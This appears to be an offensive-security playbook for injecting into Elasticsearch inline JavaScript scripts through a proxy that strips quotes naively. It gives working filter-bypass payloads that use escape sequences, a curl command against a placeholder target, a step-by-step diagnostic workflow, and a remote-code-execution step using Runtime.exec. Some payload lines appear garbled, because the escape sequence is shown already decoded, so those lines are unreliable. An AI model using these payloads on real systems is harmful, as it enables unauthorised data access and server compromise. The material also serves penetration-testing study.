# Elasticsearch inline-script injection (lang-javascript / Rhino)

## When this applies

- A front-end / proxy takes user input (e.g. a `category`/`q` parameter) and builds an **Elasticsearch inline script query** (`"script": {"inline": "...", "lang": "javascript"}`) by string-interpolating the value into a JS expression like `doc['category'].value == '<INPUT>' && doc['draft'].value == 'no'`.
- The wrapper applies naive sanitization (e.g. `value.replace("'", "")` to strip literal single quotes) and exposes only a thin search route.
- Goal: break out of the JS string to neutralise a server-side filter (draft/published/owner flag) and read hidden documents — or, since `lang-javascript`/`lang-python`/`lang-groovy` in ES ≤5.x are **not sandboxed**, escalate to RCE (CVE-2015-1427-class).

## The escape-sequence bypass

The wrapper strips the literal `'` byte, so `'` and `' OR` style payloads are removed. But a JS **escape sequence** for a quote survives the strip and is decoded by the Rhino/Nashorn engine *when it parses the script*:

- `\x27`, `'`, `\047` (octal) all decode to `'` inside the JS engine.

**Critical delivery detail:** many of these wrappers (e.g. Python `BaseHTTPServer` reading the raw query string) do **NOT URL-decode** the parameter. So `%5C` (URL-encoded backslash) arrives as the literal 4 bytes `%5C` and never becomes a backslash — every `%`-encoded attempt silently fails (returns `[]`). You must send a **raw backslash byte**.

```bash
# proxy does NOT url-decode -> send the backslash raw, NOT %5C.
# payload value:  admin'||true||'     (backslash is a literal byte)
curl -sg "http://<TARGET>/search?category=admin\\u0027||true||\\u0027"

# the wrapper strips ' (none present), builds:
#   doc['category'].value == 'admin'||true||''
# Rhino decodes ' -> ' AT PARSE TIME, so the script becomes:
#   doc['category'].value == 'admin' || true || ''   => always true
# -> filter bypassed, ALL documents returned (incl. draft/hidden).
```

## Diagnostics & workflow

1. Baseline: a valid term returns its docs; any non-matching value returns `[]`.
2. **Confirm a script context**: send a lone raw trailing backslash (`category=admin\`). If the response is `{"error":"general_script_exception"}` (or a 500), the input lands in an inline script and a backslash corrupts it → injection is viable.
3. **URL-decode test**: request `category=adm%69n`. If it does NOT match `admin`, the endpoint does not URL-decode → deliver payloads as raw bytes (no `%`-encoding).
4. Fire `category=admin'||true||'` (raw `\`). Try `\x27` and `\047` variants if `'` is filtered.
5. To **dump everything**, also try `?size=...` style params if the wrapper forwards them, or read the now-unfiltered result set.

## RCE escalation (ES ≤5.x, lang-javascript/groovy non-sandboxed)

Once you control the inline script, the JS/Groovy engine has full JVM reach (no SecurityManager sandbox on the legacy scripting plugins):

```javascript
java.lang.Runtime.getRuntime().exec("id")
```

This runs as the `elasticsearch` service user. CVE-2015-1427 (Groovy sandbox bypass) and CVE-2014-3120 (MVEL) are the documented unauth-RCE variants for ES 1.x; the `lang-javascript`/`lang-python` plugins remain unsandboxed in 5.x.

## Verifying success

- The filtered field (draft/published) no longer constrains results — previously hidden docs appear.
- `general_script_exception` on malformed input confirms the script vector.
- `exec(...)` output (or an OOB callback) confirms RCE.

## Common pitfalls

- Sending `%5C`/`%27` against an endpoint that does not URL-decode — always test decoding first, then send raw bytes.
- A bare `\` only proves the context (it errors); you still need a syntactically valid always-true expression (`'<x>'||true||''`).
- Direct Elasticsearch (`:9200`/`:9300`) is often firewalled to the proxy/service identity only — the injection through the proxy is the reachable path.

## Tools

- `curl -sg` (disable globbing so `[`/`]`/`{` survive), Burp Repeater.
- Local ES + lang-javascript plugin for payload testing.
